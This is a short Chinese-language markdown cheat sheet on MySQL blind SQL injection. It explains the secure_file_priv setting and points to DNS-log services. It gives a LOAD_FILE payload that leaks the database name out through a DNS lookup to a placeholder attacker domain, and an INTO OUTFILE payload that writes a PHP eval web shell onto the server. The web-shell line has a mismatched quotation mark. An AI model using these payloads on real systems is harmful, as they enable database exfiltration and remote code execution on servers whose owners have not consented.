# mysql盲注数据外带
## dns注入

### 前提条件
- windows系统下，且smb可用
- 安装了smb服务的linux(概率很小)
- mysql配置项`secure_file_priv`留空


### mysql配置项`secure_file_priv`简介
- `secure_file_priv`值为null时，mysqld不允许导入导出
- `secure_file_priv`值为空时，mysqld导入导出无限制
- `secure_file_priv`值为`/data/`时，mysqld导入导出路径只能为`/data/`
- 可执行`show global variables like '%secure%'`查看配置


### mysql读取文件

```
select load_file(filepath);
```

`filepath`可以输入:
- 相对路径`./filepath`
- 全局路径`C:/filepath`
- 网络共享路径`//filepath`

### dns日志

开源项目：https://github.com/BugScanTeam/DNSLog

在线工具：http://www.dnslog.cn

### demo

- 数据外带
  ```
  SELECT LOAD_FILE(CONCAT('//'.DATABASE(),'.xxx.xxx.com'));
  ```

## 写入脚本文件漏洞利用

### mysql写文件`select into`

- `outfile`可以写入多行，可输出终止符和换行格式，常用与脱库

- `dumpfile`只可写一行，并且输出中不存在任何格式，导入二进制文件不会因换行符导致文件被破坏，所以常用于写入软件 _udf提权_

### demo


- `select 123 into outfile './1.txt'`


- 写入一句话木马

  ```
  select "<?php eval($_REQUEST[8])?>" into outfile '../../../../php/a.php";
  ```

